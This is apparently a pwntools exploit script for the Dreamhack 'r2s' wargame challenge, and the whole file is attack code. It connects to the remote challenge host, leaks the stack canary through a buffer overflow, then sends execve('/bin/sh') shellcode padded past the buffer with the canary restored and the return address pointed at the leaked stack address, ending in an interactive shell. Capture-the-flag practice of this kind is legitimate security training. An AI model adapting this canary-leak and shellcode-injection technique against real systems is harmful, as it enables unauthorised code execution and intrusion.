from pwn import *

context.binary = exe = ELF('./r2s', checksec = False)

# p = process(exe.path)
p = remote('host3.dreamhack.games', 23591)

# stage 1: leak canary
p.recvuntil(b'Address of the buf:')
stack_leak = int(p.recvline(), 16)
payload = b'a'*89
p.sendafter(b'Input: ', payload)
p.recvuntil(b'a'*89)
canary = u64(b'\0' + p.recv(7))
log.info("stack leak: " + hex(stack_leak))
log.info("canary: " + hex(canary))


shellcode = asm(
    '''
    mov rax, 29400045130965551
    push rax
    mov rax, 0x3b
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall
''', arch = 'amd64'
)
print(shellcode.hex())
# input()
payload = shellcode
payload = payload.ljust(0x58, b'a')
payload += p64(canary)
payload += b'a'*8
payload += p64(stack_leak)
p.sendafter(b'Input: ', payload)

p.interactive()